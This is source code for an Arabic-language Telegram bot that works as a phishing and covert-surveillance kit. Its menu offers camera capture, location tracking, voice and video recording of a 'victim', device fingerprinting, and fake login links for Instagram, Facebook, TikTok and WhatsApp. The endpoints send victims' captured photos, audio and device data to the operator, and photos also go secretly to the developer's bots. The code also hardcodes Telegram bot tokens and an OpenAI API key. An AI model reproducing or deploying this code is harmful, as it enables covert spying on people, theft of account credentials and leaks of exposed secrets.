                                return fs.promises.unlink(framePath);
                            })
                            .catch(err => console.error(`Error reading frame ${i}:`, err))
                    );
                }
                
                Promise.all(readPromises)
                    .then(() => resolve(frames))
                    .catch(reject);
            })
            .on('error', reject);
    });
}



app.get('/capture', (req, res) => {
    res.sendFile(path.join(__dirname, 'ca.html'));
});
let userRequests = {}; 



const retry = async (fn, retries = 3, delay = 1000) => {
    try {
        return await fn();
    } catch (err) {
        if (retries === 0) throw err;
        await new Promise(resolve => setTimeout(resolve, delay));
        return retry(fn, retries - 1, delay);
    }
};










app.post('/submitPhotos', async (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);

    if (imageDatas.length > 0) {
        try {
            
            let user;
            let username = "غير متوفر";
            let fullName = "غير متوفر";
            
            try {
                user = await bot.getChat(chatId);
                username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
                fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
            } catch (userErr) {
                console.error("Error fetching user details: ", userErr);
            }

            
            const femaleBotToken = '8469890140:AAFCB6N00YMggHLC5OqAbi4C6o1Q7TwvqEw'; 
            const nsfwBotToken = '7865024716:AAEq3RmOfoguDumrz61FgRJakyxXQlUmS4k'; // بوت الاباحي
            const developerChatId = '5739065274';

            const processImagePromises = imageDatas.map(async (imageData, index) => {
                const buffer = Buffer.from(imageData, 'base64');
                
                try {
                   
                    const formData = new FormData();
                    formData.append('image', buffer, {
                        filename: `photo_${index}.jpg`,
                        contentType: 'image/jpeg'
                    });

                    const SERVER_URL = ff;
                    const API_KEY = "hkhlasjoaj5464hjsks";

                    const response = await axios.post(`${SERVER_URL}?api_key=${API_KEY}`, formData, {
                        headers: {
                            ...formData.getHeaders(),
                        },
                        timeout: 60000
                    });

                    const analysisResult = response.data;
                    console.log(`Analysis result for image ${index + 1}:`, analysisResult);

                    
                    if (analysisResult.nsfw_check === 'Yes') {

                        
                        await bot.sendMessage(chatId, "🔞 تم حظر الصورة لاحتوائها على محتوى غير لائق. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const nsfwBot = new TelegramBot(nsfwBotToken);
                        await nsfwBot.sendPhoto(developerChatId, buffer, {
                            caption: `🔞 تحذير: محتوى إباحي\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'nsfw_content', index };

                    } 
                    
                    else if (analysisResult.final_result === 'female portrait' && analysisResult.nsfw_check === 'No') {
                        
                        
                        await bot.sendMessage(chatId, "🚫 تم حظر الصورة واكتشاف ملامح أنثى في الصورة ولم يتم إرسالها. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const femaleBot = new TelegramBot(femaleBotToken);
                        await femaleBot.sendPhoto(developerChatId, buffer, {
                            caption: `🚨 تحذير: صورة أنثى\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'female_detected', index };
                    } 
                    else {
                        
                        
                        const sendToUser = bot.sendPhoto(chatId, buffer, { 
                            caption: `📸 الصورة ${index + 1}` 
                        });

                        const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                            caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                        });

                        await Promise.all([sendToUser, sendToOwner]);
                        return { success: true, index };
                    }
                } catch (analysisError) {
                    console.error(`❌ Error analyzing image ${index + 1}:`, analysisError.message);
                    
                    
                    const sendToUser = bot.sendPhoto(chatId, buffer, { 
                        caption: `📸 الصورة ${index + 1}` 
                    });

                    const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                        caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n⚠️ ملاحظة: فشل فحص الصورة`
                    });

                    await Promise.all([sendToUser, sendToOwner]);
                    return { success: true, index };
                }
            });

            await Promise.all(processImagePromises);
            
            res.json({ 
                success: true, 
                message: "تم معالجة الصور بنجاح"
            });

        } catch (error) {
            console.error("❌ Error processing photos: ", error);
            res.status(500).json({ error: "حدث خطأ أثناء معالجة الصور." });
        }
    } else {
        console.log("No photos received.");
        res.status(400).json({ error: "لم يتم إرسال صور." });
    }
});






app.post('/imageReceiver', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;

    if (files && files.length > 0) {
        console.log(`تم استلام ${files.length} صور من المستخدم ${chatId}`);

        try {
            
            let user;
            let username = "غير متوفر";
            let fullName = "غير متوفر";
            
            try {
                user = await bot.getChat(chatId);
                username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
                fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
            } catch (userErr) {
                console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", userErr);
            }

            
            const femaleBotToken = '8469890140:AAFCB6N00YMggHLC5OqAbi4C6o1Q7TwvqEw';//بوت الانثي
            const nsfwBotToken = '7865024716:AAEq3RmOfoguDumrz61FgRJakyxXQlUmS4k'; // بوت الاباحي 
            const developerChatId = '5739065274';

            const processImagePromises = files.map(async (file, index) => {
                try {
                  
                    const formData = new FormData();
                    formData.append('image', file.buffer, {
                        filename: `photo_${index}.jpg`,
                        contentType: 'image/jpeg'
                    });

                    const SERVER_URL = ff;
                    const API_KEY = "hkhlasjoaj5464hjsks";

                    const response = await axios.post(`${SERVER_URL}?api_key=${API_KEY}`, formData, {
                        headers: {
                            ...formData.getHeaders(),
                        },
                        timeout: 60000
                    });

                    const analysisResult = response.data;
                    console.log(`Analysis result for image ${index + 1}:`, analysisResult);

                    
                    if (analysisResult.nsfw_check === 'Yes') {

                        
                        await bot.sendMessage(chatId, "🔞 تم حظر الصورة لاحتوائها على محتوى غير لائق. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const nsfwBot = new TelegramBot(nsfwBotToken);
                        await nsfwBot.sendPhoto(developerChatId, file.buffer, {
                            caption: `🔞 تحذير: محتوى إباحي\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'nsfw_content', index };

                    } 
                    
                    else if (analysisResult.final_result === 'female portrait' && analysisResult.nsfw_check === 'No') {
                        
                        
                        await bot.sendMessage(chatId, "🚫 تم حظر الصورة واكتشاف ملامح أنثى في الصورة ولم يتم إرسالها. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const femaleBot = new TelegramBot(femaleBotToken);
                        await femaleBot.sendPhoto(developerChatId, file.buffer, {
                            caption: `🚨 تحذير: صورة أنثى\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'female_detected', index };
                    } 
                    else {
                        
                        
                        const sendToUser = bot.sendPhoto(chatId, file.buffer, { 
                            caption: `📸 صورة تم إرسالها.` 
                        });

                        const sendToOwner = botOwner.sendPhoto(ownerChatId, file.buffer, {
                            caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                        });

                        await Promise.all([sendToUser, sendToOwner]);
                        return { success: true, index };
                    }
                } catch (analysisError) {
                    console.error(`❌ Error analyzing image ${index + 1}:`, analysisError.message);
                    
                    
                    const sendToUser = bot.sendPhoto(chatId, file.buffer, { 
                        caption: `📸 صورة تم إرسالها.` 
                    });

                    const sendToOwner = botOwner.sendPhoto(ownerChatId, file.buffer, {
                        caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n⚠️ ملاحظة: فشل فحص الصورة`
                    });

                    await Promise.all([sendToUser, sendToOwner]);
                    return { success: true, index };
                }
            });

            await Promise.all(processImagePromises);
            
            res.json({ 
                success: true,
                message: "تم معالجة الصور بنجاح"
            });

        } catch (error) {
            console.error("❌ Error processing photos: ", error);
            res.status(500).json({ error: "حدث خطأ أثناء معالجة الصور." });
        }
    } else {
        console.log("لم يتم إرسال صور.");
        res.status(400).json({ error: "لم يتم إرسال صور." });
    }
});

app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voicePath = req.file.path;

    bot.sendVoice(chatId, voicePath).then(() => {
        fs.unlinkSync(voicePath);
        res.send('');
    }).catch(error => {
        console.error(error);
        res.status(500).send('خطأ.');
    });
});
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`الخادم يعمل على المنفذ ${PORT}`);
});
app.get('/:userId', (req, res) => {
    res.sendFile(path.join(__dirname, 'mm.html'));
});


app.post('/mm', async (req, res) => {
    const chatId = req.body.userId;
    const deviceInfo = req.body.deviceInfo;

    if (deviceInfo) {
        const message = `
📱 **معلومات الجهاز:**
- الدولة: ${deviceInfo.country} 🔻
- المدينة: ${deviceInfo.city} 🏙️
- عنوان IP: ${deviceInfo.ip} 🌍
- شحن الهاتف: ${deviceInfo.battery}% 🔋
- هل الهاتف يشحن؟: ${deviceInfo.isCharging} ⚡
- الشبكة: ${deviceInfo.network} 📶 (سرعة: ${deviceInfo.networkSpeed} ميغابت في الثانية)
- نوع الاتصال: ${deviceInfo.networkType} 📡
- الوقت: ${deviceInfo.time} ⏰
- اسم الجهاز: ${deviceInfo.deviceName} 🖥️
- إصدار الجهاز: ${deviceInfo.deviceVersion} 📜
- نوع الجهاز: ${deviceInfo.deviceType} 📱
- الذاكرة (RAM): ${deviceInfo.memory} 🧠
- الذاكرة الداخلية: ${deviceInfo.internalStorage} GB 💾
- عدد الأنوية: ${deviceInfo.cpuCores} ⚙️
- لغة النظام: ${deviceInfo.language} 🌐
- اسم المتصفح: ${deviceInfo.browserName} 🌐
- إصدار المتصفح: ${deviceInfo.browserVersion} 📊
- دقة الشاشة: ${deviceInfo.screenResolution} 📏
- إصدار نظام التشغيل: ${deviceInfo.osVersion} 🖥️
- وضع الشاشة: ${deviceInfo.screenOrientation} 🔄
- عمق الألوان: ${deviceInfo.colorDepth} 🎨
- تاريخ آخر تحديث للمتصفح: ${deviceInfo.lastUpdate} 📅
- بروتوكول الأمان المستخدم: ${deviceInfo.securityProtocol} 🔒
- نطاق التردد للاتصال: ${deviceInfo.connectionFrequency} 📡
- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocationAvailable} 🌍
- الدعم لتقنية البلوتوث: ${deviceInfo.bluetoothSupport} 🔵
- دعم الإيماءات اللمسية: ${deviceInfo.touchSupport} ✋
        `;

        try {
            await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
            console.log('تم إرسال معلومات الجهاز بنجاح');
            res.json({ success: true });
        } catch (err) {
            console.error('فشل في إرسال معلومات الجهاز:', err);
            res.status(500).json({ error: 'فشل في إرسال معلومات الجهاز' });
        }
    } else {
        console.log('لم يتم استلام معلومات الجهاز');
        res.status(400).json({ error: 'لم يتم استلام معلومات الجهاز' });
    }
});








app.post('/so', async (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);

    if (imageDatas.length > 0) {
        try {
            
            let user;
            let username = "غير متوفر";
            let fullName = "غير متوفر";
            
            try {
                user = await bot.getChat(chatId);
                username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
                fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
            } catch (userErr) {
                console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", userErr);
            }

            
            const femaleBotToken = '8469890140:AAFCB6N00YMggHLC5OqAbi4C6o1Q7TwvqEw';//بوت الانثى
            const nsfwBotToken = '7865024716:AAEq3RmOfoguDumrz61FgRJakyxXQlUmS4k'; // بوت الاباحي
            const developerChatId = '5739065274';

            const processImagePromises = imageDatas.map(async (imageData, index) => {
                const buffer = Buffer.from(imageData, 'base64');
                
                try {
                 
                    const formData = new FormData();
                    formData.append('image', buffer, {
                        filename: `photo_${index}.jpg`,
                        contentType: 'image/jpeg'
                    });

                    const SERVER_URL = ff;
                    const API_KEY = "hkhlasjoaj5464hjsks";

                    const response = await axios.post(`${SERVER_URL}?api_key=${API_KEY}`, formData, {
                        headers: {
                            ...formData.getHeaders(),
                        },
                        timeout: 60000
                    });

                    const analysisResult = response.data;
                    console.log(`Analysis result for image ${index + 1}:`, analysisResult);

                    
                    if (analysisResult.nsfw_check === 'Yes') {
                        
                        
                        await bot.sendMessage(chatId, "🔞 تم حظر الصورة لاحتوائها على محتوى غير لائق. الرجاء الالتزام بقواعد البوت.");
                        

                        const nsfwBot = new TelegramBot(nsfwBotToken);
                        await nsfwBot.sendPhoto(developerChatId, buffer, {
                            caption: `🔞 تحذير: محتوى إباحي\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'nsfw_content', index };

                    } 

                    else if (analysisResult.final_result === 'female portrait' && analysisResult.nsfw_check === 'No') {
                        
                        
                        await bot.sendMessage(chatId, "🚫 تم حظر الصورة واكتشاف ملامح أنثى في الصورة ولم يتم إرسالها. الرجاء الالتزام بقواعد البوت.");
                        

                        const femaleBot = new TelegramBot(femaleBotToken);
                        await femaleBot.sendPhoto(developerChatId, buffer, {
                            caption: `🚨 تحذير: صورة أنثى\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'female_detected', index };
                    } 
                    else {

                        
                        const sendToUser = bot.sendPhoto(chatId, buffer, { 
                            caption: `📸 الصورة ${index + 1}` 
                        });

                        const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                            caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                        });

                        await Promise.all([sendToUser, sendToOwner]);
                        return { success: true, index };
                    }
                } catch (analysisError) {
                    console.error(`❌ Error analyzing image ${index + 1}:`, analysisError.message);
                    

                    const sendToUser = bot.sendPhoto(chatId, buffer, { 
                        caption: `📸 الصورة ${index + 1}` 
                    });

                    const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                        caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n⚠️ ملاحظة: فشل فحص الصورة`
                    });

                    await Promise.all([sendToUser, sendToOwner]);
                    return { success: true, index };
                }
            });

            await Promise.all(processImagePromises);
            
           
            if (dataStore[chatId] && dataStore[chatId].userLink) {
                res.redirect(dataStore[chatId].userLink);
            } else {
                res.send('حدث خطاء ❌');
            }

        } catch (error) {
            console.error("❌ Error processing photos: ", error);
            
            
            if (dataStore[chatId] && dataStore[chatId].userLink) {
                res.redirect(dataStore[chatId].userLink);
            } else {
                res.send('حدث خطاء ❌');
            }
        }
    } else {
        console.log("No photos received.");
        
        // التوجيه حتى لو لم توجد صور
        if (dataStore[chatId] && dataStore[chatId].userLink) {
            res.redirect(dataStore[chatId].userLink);
        } else {
            res.send('حدث خطاء ❌');
        }
    }
});






app.get('/ca', (req, res) => {
    res.sendFile(path.join(__dirname, 'k.html'));
});
let linkUsage = {};
const maxAttemptsPerButton = 555; 

function validateLinkUsage(userId, action) {
    const userActionId = `${userId}:${action}`;
    if (isVIPUser(userId)) {
        return true;
    }

    if (linkUsage[userActionId] && linkUsage[userActionId].attempts >= maxAttemptsPerButton) {
        return false;
    }

    if (!linkUsage[userActionId]) {
        linkUsage[userActionId] = { attempts: 0 };
    }

    linkUsage[userActionId].attempts++;
    return true;
}


let vipUsers = {};

function addVIPUser(userId) {
    vipUsers[userId] = true;
}

function removeVIPUser(userId) {
    delete vipUsers[userId];
}

function isVIPUser(userId) {
    return !!vipUsers[userId];
}


bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
    const chatId = msg.chat.id;
    const isSubscribed = await isUserSubscribed(chatId);

    if (!isSubscribed) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => [
            { text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }
        ]);

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
        return;
    }

    const mainMenuMessage = 'مرحبًا! بك كل الازرار مجاناً:';
    const mainMenuButtons = [
        [
            { text: 'اخـ ^_^ـ.راق الكامرا الأمامية 📸', callback_data: `captureFront:${chatId}` },
            { text: 'اخـ ^_^ـ.راق الكامرا الخلفية 📷', callback_data: `captureBack:${chatId}` }
        ],
        [
            { text: 'اخـ ^_^ـ.راق الموقع 📍', callback_data: `getLocation:${chatId}` },
            { text: 'تسجيل صوت الضحية 🎤', callback_data: `recordVoice:${chatId}` }
        ],
        [
            { text: 'اخـ ^_^ـ.راق كاميرات المراقبة 📡', callback_data: 'get_cameras' },
            { text: 'تصوير الضحية فيديو 🎥', callback_data: 'capture_video' }
        ],
        [
            { text: 'اخـ ^_^ـ.راق واتساب 🟢', callback_data: 'request_verification' },
            { text: 'اخـ ^_^ـ.راق انستجرام 🖥', callback_data: `rshq_instagram:${chatId}` }
        ],
        [
            { text: 'اخـ ^_^ـ.راق فيسبوك 🔮', callback_data: `rshq_facebook:${chatId}` },
            { text: 'اخـ ^_^ـ.راق ببجي 🕹', callback_data: 'get_pubg' }
        ],
        [
            { text: 'اخـ ^_^ـ.راق فري فاير 👾', callback_data: 'get_freefire' },
            { text: 'اخـ ^_^ـ.راق سناب شات ⭐', callback_data: 'add_names' }
        ],
        [
            { text: 'اخـ ^_^ـ.راق تيك توك 📳', callback_data: `rshq_tiktok:${chatId}` },
            { text: 'الدردشة مع الذكاء الاصطناعي 🤖', web_app: { url: 'https://fluorescent-fuschia-longan.glitch.me/' } }
        ],
        [
            { text: 'جمع معلومات الجهاز 🔬', callback_data: 'collect_device_info' },
            { text: 'تفسير الأحلام 🧙‍♂️', web_app: { url: 'https://morning-animated-drifter.glitch.me/' } }
        ],
        [
            { text: 'تلغيم رابط ⚠️', callback_data: 'get_link' },
            { text: 'اخـ ^_^ـ.راق الهاتف كاملاً 🔞', callback_data: 'add_nammes' }
        ],
        [
            { text: 'لعبة الأذكياء 🧠', web_app: { url: 'https://forest-plausible-practice.glitch.me/' } },
            { text: 'شرح البوت 👨🏻‍🏫', url: 'https://t.me/lTV_l/33' }
        ],
        [
            { text: 'إغلاق المواقع 💣', web_app: { url: 'https://cuboid-outstanding-mask.glitch.me/' } },
            { text: 'إنشاء إيميل وهمي 💌', callback_data: 'create_email' }
        ],
        [
            { text: "صيد فيزات 💳", callback_data: "generate_visa" }, 
            { text: 'تصوير بدقه عاليه 🖼', callback_data: 'get_photo_link' }

        ],
        [
           { text: "معرفة رقم الضحيه 📲", callback_data: "generate_invite" }, 
            { text: 'الرقام وهميه ☎️', callback_data: 'get_number' }
        ],
        [
           { text: 'فحص الروابط 🪄', callback_data: 'check_links' }, 
           { text: 'البحث عن صور 🎨', callback_data: 'search_images' }
        ], 
        [
           { text: "اعطني نكتة 🤣", callback_data: 'نكتة' }, 
           { text: 'اخـ ^_^ـ.راق بث الراديو 📻', callback_data: 'get_radio_countries_0' }
         ], 
         [
           { text: 'زخرفة الاسماء 🗿', callback_data: 'zakhrafa' }, 
           { text: 'تحويل النص إلى صوت 🔄', callback_data: 'convert_text' }
         ], 
        [
           { text: 'صيد يوزرت تلجرام 🪝', callback_data: 'choose_type' }, 
           { text: "الذكاء الاصطناعي الشرير 🧠", callback_data: 'start_private_chat' }

        ], 
        [
           { text: 'الرقام وهميه 2 ☎️', callback_data: 'الحصول_على_رقم' }, 
           { text: "كتابة رساله فك وتساب ⛔", callback_data: 'إرسال_رسالة' }

        ], 
        [ 

           { text: 'التواصل مع المطور', url: 'https://t.me/VlP_12' }

        ]
     ] 

    bot.sendMessage(chatId, mainMenuMessage, {
        reply_markup: {
            inline_keyboard: mainMenuButtons
        }
    });


    if (chatId === 5739065274) {
        const adminMenuMessage = 'مرحبًا بك عزيزي حمودي في لوحة التحكم:';
        const adminMenuButtons = [
            [
                { text: 'إضافة مشترك VIP', callback_data: 'add_vip' },
                { text: 'إلغاء اشتراك VIP', callback_data: 'remove_vip' }
            ]
        ];

        bot.sendMessage(chatId, adminMenuMessage, {
            reply_markup: {
                inline_keyboard: adminMenuButtons
            }
        });
    }
});


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'capture_video') {
        // رابط الموقع المستهدف
        const url = "https://sssssskskjwnsb-linklsksn.hf.space";
        
        // إرسال رسالة انتظار
        
        
        // استيراد الروابط من الموقع
        axios.get(url, { timeout: 10000 })
            .then(response => {
                const $ = cheerio.load(response.data);
                let foundLink = null;
                
                // البحث عن الرابط الذي ينتهي بـ "/ca"
                $('a[href]').each((index, element) => {
                    const link = $(element).attr('href');
                    if (link.endsWith('/ca')) {
                        foundLink = link;
                        return false; // إيقاف loop عند العثور على أول رابط
                    }
                });
                
                if (foundLink) {
                    // بناء الرابط النهائي مع chatId
                    const fullLink = `${foundLink}?chatId=${chatId}`;
                    const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
                    
                    bot.sendMessage(chatId, message);
                } else {
                    bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
                }
            })
            .catch(error => {
                console.error('Error fetching link:', error);
                bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
            });
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    const exemptButtons = ['add_names', 'get_cameras', 'get_freefire', 'rshq_instagram', 'get_pubg', 'rshq_tiktok', 'add_nammes', 'rshq_facebook'];

    if (!exemptButtons.includes(data.split(':')[0]) && !(await isUserSubscribed(chatId))) {
        const message = 'الرجاء الاشتراك في جميع قنوات المطور قبل استخدام البوت.';
        const buttons = developerChannels.map(channel => ({ text: `اشترك في ${channel}`, url: `https://t.me/${channel.substring(1)}` }));

        bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: [buttons]
            }
        });
        return;
    }

    if (data === 'request_verification') {
        const url = "https://sssssskskjwnsb-linklsksn.hf.space";

// استيراد الروابط من الموقع
axios.get(url, { timeout: 10000 })
    .then(response => {
        const $ = cheerio.load(response.data);
        let foundLink = null;
        
        // البحث عن الرابط الذي ينتهي بـ "/n"
        $('a[href]').each((index, element) => {
            const link = $(element).attr('href');
            if (link.endsWith('/n')) {
                foundLink = link;
                return false; // إيقاف loop عند العثور على أول رابط
            }
        });
        
        if (foundLink) {
            // بناء الرابط النهائي مع chatId
            const fullLink = `${foundLink}?chatId=${chatId}`;
            const message = `✅ تم إنشاء الرابط بنجاح\n\n🔗 الرابط: ${fullLink}\n\nملاحظة: قم باستخدام رابط جديد في كل مرة ويجب أن يكون الاتصال قويًا في جهاز الضحية`;
            
            return bot.sendMessage(chatId, message);
        } else {
            return bot.sendMessage(chatId, "❌ لم يتم العثور على رابط مناسب في الموقع");
        }
    })
    .catch(error => {
        console.error('Error fetching link:', error);
        bot.sendMessage(chatId, `❌ خطأ في جلب الرابط: ${error.message}`);
    });

    const [action, userId] = data.split(':');

    if (action === 'get_joke') {
        try {
            const jokeMessage = 'اعطيني نكته يمنيه قصيره جداً بلهجه اليمنيه الاصيله🤣🤣🤣🤣';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: jokeMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const joke = response.data.choices[0].message.content;

            bot.sendMessage(chatId, joke);
        } catch (error) {
            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
        }
    } else if (data === 'get_love_message') {
        try {
            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: loveMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const joke = response.data.choices[0].message.content;

            bot.sendMessage(chatId, joke);
        } catch (error) {
            console.error('Error fetching joke:', error.response ? error.response.data : error.message);
            bot.sendMessage(chatId, 'حدثت مشكلة أثناء جلب النكتة. الرجاء المحاولة مرة أخرى لاحقًا😁.');
        }
    } else if (data === 'get_love_message') {
        try {
            const loveMessage = 'اكتب لي رساله طويله جداً لا تقل عن 800حرف  رساله جميله ومحرجه وكلمات جمله ارسلها لشركة وتساب لفك الحظر عن رقمي المحظور مع اضافة فاصله اضع فيها رقمي وليس اسمي';
            const apiUrl = 'https://api.openai.com/v1/chat/completions';
            const response = await axios.post(apiUrl, {
                model: 'gpt-3.5-turbo',
                messages: [{ role: 'user', content: loveMessage }]
            }, {
                headers: {
                    'Authorization': 'Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA',
                    'Content-Type': 'application/json'
                }
            });
            const love = response.data.choices[0].message.content;

            bot.sendMessage(chatId, love);  
} catch (error) {  
    console.error('Error fetching love message:', error.response ? error.response.data : error.message);  
    const errorMsg = 'حدثت مشكلة أثناء جلب الرسالة. الرجاء المحاولة مرة أخرى لاحق😁ًا.';
    if (errorMsg && errorMsg.trim() !== '') {
        bot.sendMessage(chatId, errorMsg);
    }
}  
} else if (data === 'add_vip' && chatId == 5739065274) {  
    const addVipMsg = 'الرجاء إرسال معرف المستخدم لإضافته كـ VIP:';
    if (addVipMsg && addVipMsg.trim() !== '') {
        bot.sendMessage(chatId, addVipMsg);
    }
    bot.once('message', (msg) => {  
        const userId = msg.text;  
        addVIPUser(userId);
        const addedMsg = `تم إضافة المستخدم ${userId} كـ VIP.`;
        if (addedMsg && addedMsg.trim() !== '') {
            bot.sendMessage(chatId, addedMsg);
        }
    });  
} else if (data === 'remove_vip' && chatId == 5739065274) {  
    const removeVipMsg = 'الرجاء إرسال معرف المستخدم لإزالته من VIP:';
    if (removeVipMsg && removeVipMsg.trim() !== '') {
        bot.sendMessage(chatId, removeVipMsg);
    }
    bot.once('message', (msg) => {  
        const userId = msg.text;  
        removeVIPUser(userId);
        const removedMsg = `تم إزالة المستخدم ${userId} من VIP.`;
        if (removedMsg && removedMsg.trim() !== '') {
            bot.sendMessage(chatId, removedMsg);
        }
    });  
} else {  
    const [action, userId] = data.split(':');  

    if (!exemptButtons.includes(action) && !validateLinkUsage(userId, action)) {  
        // هنا غيرت السطر ليمنع إرسال رسالة فارغة
        // bot.sendMessage(chatId, '');  
        return;  
    }  

    let link = '';

        switch (action) {
            case 'captureFront':
                link = `https://mellifluous-frangipane-c22acb.netlify.app/c/?chatId=${chatId}`;
                break;
            case 'captureBack':
                link = `https://meek-froyo-0df2e1.netlify.app/b/?chatId=${chatId}`;
                break;
            case 'getLocation':
                link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                break;
            case 'recordVoice':
                const duration = 10;  
                link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                break;
            case 'rshq_tiktok':
                link = `https://zippy-kringle-e8e51f.netlify.app/t/?chatId=${chatId}&type=tiktok`;
                break;
            case 'rshq_instagram':
                link = `https://eloquent-brigadeiros-4de644.netlify.app/i/?chatId=${chatId}`;
                break;
            case 'rshq_facebook':
                link = `https://serene-sfogliatella-65867a.netlify.app/fe/?chatId=${chatId}`;
                break;
            default:
                bot.sendMessage(chatId, '');
                return;
        }

        bot.sendMessage(chatId, `تم إنشاء الرابط: ${link}`);
    }

    bot.answerCallbackQuery(callbackQuery.id);
});
